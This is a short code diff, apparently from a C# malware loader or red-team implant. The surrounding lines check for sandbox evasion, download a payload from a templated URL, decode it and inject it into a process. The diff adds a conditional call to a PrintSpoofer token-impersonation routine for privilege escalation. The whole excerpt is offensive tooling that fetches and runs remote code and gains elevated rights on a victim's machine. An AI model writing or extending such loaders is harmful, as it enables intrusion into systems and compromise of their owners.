@@ -172,6 +172,9 @@ if (EvasionCheck.Detected)
 var httpClient = new HttpClient();
 var data = await httpClient.GetStringAsync("<%URL%>");
 var buf = Decoder.DecodeString(data);
+#if IMPERSONATE
+await PrintSpoofer.AutoSpoof("pwn", "<%URL%>", null);
+#endif
 #if INJECT
 await InjectProcess.Run(buf);
 #else
